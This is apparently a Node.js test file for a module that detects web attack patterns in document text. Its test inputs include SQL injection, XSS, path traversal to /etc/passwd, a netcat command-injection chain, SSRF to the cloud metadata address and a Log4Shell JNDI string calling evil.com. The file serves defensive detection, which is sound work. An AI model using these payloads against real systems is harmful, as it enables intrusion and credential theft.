'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');

const engine = require('../src/services/document-attack-patterns');
const { extractAttackPatterns, buildAttackPatternsForFiles, renderAttackPatternsBlock } = engine;

test('empty / non-string tolerated', () => {
  assert.equal(extractAttackPatterns('').total, 0);
  assert.equal(extractAttackPatterns(null).total, 0);
});

test('detects UNION SELECT (SQLi)', () => {
  const r = extractAttackPatterns("Log: '?id=1 UNION SELECT password FROM users--");
  assert.ok(r.entries.some((e) => e.kind === 'sqli'));
});

test('detects SQL tautology', () => {
  const r = extractAttackPatterns("'?id=1' OR 1=1--");
  assert.ok(r.entries.some((e) => e.kind === 'sqli'));
});

test('detects time-based SQLi sleep()', () => {
  const r = extractAttackPatterns("'?id=1;sleep(10)--");
  assert.ok(r.entries.some((e) => e.kind === 'sqli' && e.label === 'time-based'));
});

test('detects <script> XSS', () => {
  const r = extractAttackPatterns('Payload: <script>alert(1)</script>');
  assert.ok(r.entries.some((e) => e.kind === 'xss'));
});

test('detects javascript: XSS', () => {
  const r = extractAttackPatterns('link=javascript:alert(1)');
  assert.ok(r.entries.some((e) => e.kind === 'xss'));
});

test('detects onerror handler', () => {
  const r = extractAttackPatterns('<img src=x onerror="alert(1)">');
  assert.ok(r.entries.some((e) => e.kind === 'xss'));
});

test('detects path traversal', () => {
  const r = extractAttackPatterns('GET /../../../../etc/passwd');
  assert.ok(r.entries.some((e) => e.kind === 'lfi'));
});

test('detects URL-encoded path traversal', () => {
  const r = extractAttackPatterns('?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd');
  assert.ok(r.entries.some((e) => e.kind === 'lfi'));
});

test('detects php:// wrapper', () => {
  const r = extractAttackPatterns('?file=php://input');
  assert.ok(r.entries.some((e) => e.kind === 'lfi'));
});

test('detects command-injection shell chain', () => {
  const r = extractAttackPatterns('input=foo; nc -lvp 4444');
  assert.ok(r.entries.some((e) => e.kind === 'cmdi'));
});

test('detects SSRF protocol smuggling', () => {
  const r = extractAttackPatterns('url=file:///etc/hosts');
  assert.ok(r.entries.some((e) => e.kind === 'ssrf'));
});

test('detects AWS cloud-metadata SSRF', () => {
  const r = extractAttackPatterns('curl http://169.254.169.254/latest/meta-data');
  assert.ok(r.entries.some((e) => e.kind === 'ssrf' && e.label === 'cloud-metadata'));
});

test('detects Log4Shell JNDI', () => {
  const r = extractAttackPatterns('User-Agent: ${jndi:ldap://evil.com/x}');
  assert.ok(r.entries.some((e) => e.kind === 'log4shell'));
});

test('detects SSTI Jinja/Twig', () => {
  const r = extractAttackPatterns('payload={{7*7}}');
  assert.ok(r.entries.some((e) => e.kind === 'ssti'));
});

test('caps entries per file', () => {
  let text = '';
  for (let i = 0; i < 20; i++) text += `<script>x${i}</script> `;
  const r = extractAttackPatterns(text);
  assert.ok(r.entries.length <= 14);
});

test('counts totals by kind', () => {
  const r = extractAttackPatterns(
    'UNION SELECT 1,2,3 and <script>x</script> and ../../../etc/passwd'
  );
  assert.ok(r.totals.sqli >= 1);
  assert.ok(r.totals.xss >= 1);
  assert.ok(r.totals.lfi >= 1);
});

test('buildAttackPatternsForFiles aggregates across batch', () => {
  const files = [
    { name: 'log1', extractedText: '<script>x</script>' },
    { name: 'log2', extractedText: '../../etc/passwd' },
  ];
  const r = buildAttackPatternsForFiles(files);
  assert.equal(r.perFile.length, 2);
});

test('renderAttackPatternsBlock returns markdown when entries exist', () => {
  const files = [{ name: 'log', extractedText: '<script>x</script>' }];
  const r = buildAttackPatternsForFiles(files);
  const md = renderAttackPatternsBlock(r);
  assert.match(md, /^## ATTACK/);
});

test('renderAttackPatternsBlock empty when nothing surfaces', () => {
  assert.equal(renderAttackPatternsBlock({ perFile: [] }), '');
  assert.equal(renderAttackPatternsBlock(null), '');
});

test('handles non-string extractedText', () => {
  const r = buildAttackPatternsForFiles([
    { name: 'a', extractedText: null },
    { name: 'b', extractedText: '<script>x</script>' },
  ]);
  assert.equal(r.perFile.length, 1);
});
